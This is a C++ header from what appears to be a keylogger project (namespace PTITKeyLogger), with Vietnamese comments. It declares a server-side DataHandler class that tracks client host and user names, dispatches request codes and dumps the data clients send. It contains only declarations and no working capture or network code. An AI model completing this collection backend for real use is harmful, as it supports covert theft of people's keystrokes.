#ifndef DATAHANDLER_HPP_
#define DATAHANDLER_HPP_

#include "DataFactory.hpp"
#include "IData.hpp"
#include "Protocol.hpp"
#include <functional>
#include <unordered_map>
#include <utility>

using namespace std;

class DataHandler{
public:
  DataHandler();
  ~DataHandler() = default;

  void handleData(const int &id, const vector<char> &data);

private:
    // 1 đối tượng DataFactory để tạo 1 đối tượng IData
    DataFactory<IData> _factory;
    // Một map để ánh xạ yêu cầu đến tin nhắn yêu cầu tương ứng
    map<PTITKeyLogger::RequestCode, string> _mapRequestMessage;
    // Một map ánh xạ id của client đến cặp host và user tương ứng
    map<int, pair<string, string>> _mapClient;

    // Một map ánh xạ mã yêu cầu đến hàm xử lý tương ứng
    unordered_map<PTITKeyLogger::RequestCode,
                function<void(DataHandler &, const int &,
                            const pair<string, string> &hostUser,
                            const vector<char> &data)>> 
    _requestHandler;
private:
    DataHandler(const DataHandler &cp) = delete;
    DataHandler &operator=(const DataHandler &cp) = delete;

    // Cung cấp dữ liệu cho các map và đối tượng
    void feedFactory(void);
    void feedDataMaps();
    
    // Xử lý ID của client
    void treatID(const int &id);
    // Kiểm tra ID của client đã đc thiết lập chưa
    bool isIDSet(const int &id);

    // Xử lý dữ liệu từ client
    void handleIdResponse(const int &id,
                            const pair<string, string> &hostUser,
                            const vector<char> &data);

    void dumpData(const int &id,
                const pair<string, string> &hostUser,
                const vector<char> &data);
    
    void printCodeRespose(const int &id,
                        const pair<string, string> &hostUser,
                        const vector<char> &data);
};

#endif /* DATAHANDLER_HPP_ */